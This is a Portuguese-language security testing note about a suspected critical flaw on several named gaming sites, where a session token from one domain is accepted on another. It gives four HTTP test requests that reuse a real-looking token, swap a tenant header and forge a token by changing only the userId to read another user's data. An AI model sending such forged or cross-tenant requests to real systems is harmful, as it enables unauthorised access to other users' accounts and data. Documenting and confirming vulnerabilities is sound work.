# Possível CRÍTICO — token reutilizado entre domínios diferentes

## O que aconteceu

Na sessão 2026-06-08, um único token gerado em `aphrodite777.com`:
```
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
```

foi aceito sem erro em `hus3wyear.ccgamevip.com` (domínio diferente,
infra diferente, possivelmente backend separado). Veja:

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 207587
Xutc: aphrodite777

→ HTTP/2 200 OK
{"code":200,"msg":"success","data":{"id":172929,"userId":207587,"day":20260609,"reward":100,...}}
```

## Por que isso importa

Numa arquitetura segura, cada tenant teria seu próprio segredo de HMAC.
Tokens de `aphrodite777` seriam **inválidos** em `ccgamevip.com`.
Aqui, o token foi aceito. Significa um destes três:

1. **Mesmo segredo HMAC** entre todos os tenants — então qualquer
   user de qualquer tenant pode acessar APIs dos outros.
2. **Sem validação real de hash** — o `:hash` no token é decorativo,
   só o `userId` no início importa. Pior caso.
3. **Validação delega ao header `Xutc`** — atacante coloca
   `Xutc: aphrodite777` e ganha acesso. Trocando o `Xutc`, ganha em
   outro tenant.

Qualquer uma das 3 hipóteses é vulnerabilidade séria.

## Como confirmar

### Teste 1 — Token aphrodite em endpoint amizade

```http
GET /japi/user/balance/querySimpleBalance HTTP/2
Host: ds.amizade777.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
```

Esperado: `code:401` ou `code:403`.
Se vier `code:200`, é cross-tenant confirmado.

### Teste 2 — Mesmo token, sem `Xutc`

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 207587
[REMOVE Xutc]
```

Se aceitar, o `Xutc` é decorativo.

### Teste 3 — Trocar Xutc para outro tenant

```http
GET /prod-api/year/api/yearRechargeReward HTTP/2
Host: hus3wyear.ccgamevip.com
Token: 207587:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
Nbcx: 207587
Xutc: amizade777
```

Se vier 200 com dados de `amizade777`, então o `Xutc` controla qual
backend responde — atacante pode varrer todos os tenants com 1 token.

### Teste 4 — Forjar token cross-user

Se o hash do token não validar tenant nem segredo, dá pra trocar só
o userId no início:

```
Token: 137028:1781026736:3001:3d1022d4885108c66afee70e43c58ebc
                                ^^^ mantém o hash original
Nbcx: 137028
```

Se o backend retornar dados do user 137028, é IDOR + token forjável.
**Severidade crítica.**

## Cole os resultados aqui

```
[teste 1]
```

```
[teste 2]
```

```
[teste 3]
```

```
[teste 4]
```
